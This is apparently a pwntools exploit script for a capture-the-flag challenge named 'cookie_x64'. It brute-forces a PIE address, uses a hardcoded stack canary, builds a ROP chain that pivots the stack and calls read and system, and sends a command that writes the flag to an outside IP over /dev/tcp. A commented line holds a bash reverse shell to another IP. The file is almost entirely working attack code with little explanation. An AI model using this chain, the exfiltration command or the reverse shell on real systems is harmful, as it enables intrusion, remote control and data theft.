from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",23003)
elf=ELF("./cookie_x64")
libc=ELF("./x64_libc-2.23.so")

'''
canary=p64(0x46a192553b25b200)
#rbp=p64(0x00007ffca392cb24)
pie="\x24"
for j in range(8):
    for i in range(256):
        r=remote("pwn.sixstars.team",23003)
        #pause()
        if i==10:
            continue
        r=remote("pwn.sixstars.team",23003)
        sh='a'*0x48+canary+pie+chr(i)
        try:
            r.recvline()
            r.sendline(sh)
            #r.sendafterline("PIE?",sh)
            r.recv()
            r.close()
        except:
            pass
        else:
            pie=pie+chr(i)
            r.close()
            break
print u64(pie)
exit(0)
'''

canary=0x46a192553b25b200
rbp=0x00007ffca392cb24-0x24+0xa0
#rbp=0x00007ffca392c030
pie=0x0000556bfbaaa4ee
base=pie-0x14ee
beginning=rbp-(0x7ffd61dfa030-0x7ffd61df9f90)
leave=base+0xf8c
bind=base+0x2020B0
write=base+0x12D0
mems_got=base+0x202068
p_rdi=base+0x00000000000015a3

libc.address=0x7f2b4746b000
p_rdx=libc.address+0x0000000000001b92
p_rsi=libc.address+0x00000000000202e8

system=libc.sym['system']
read=libc.sym['read']
bss=base+0x202800


#sh='bash 1>&4 0>&4'+'a'*(0x48-14)+p64(canary)+p64(rbp)+p64(p_rdi)+p64(beginning)+p64(system) 
sh=p64(0)+p64(p_rsi)+p64(bss)+p64(p_rdx)+p64(0x100)+p64(read)+p64(p_rdi)+p64(bss)+p64(system)+p64(canary)+p64(beginning)+p64(leave)
#sh='b'*0x8+'a'*0x40+p64(canary)+p64(rbp)+p64(p_rsi)+p64(rbp-0x24+0xa0)+p64(p_rdi)+p64(4)+p64(write)
r.recvline()
pause()
r.sendline(sh)
sleep(1)
r.send('bash -c "cat flag > /dev/tcp/10.132.141.62/2222"')
#r.send('bash -c "bash -i >& /dev/tcp/138.68.0.234/1234 0>&1"')

r.interactive()
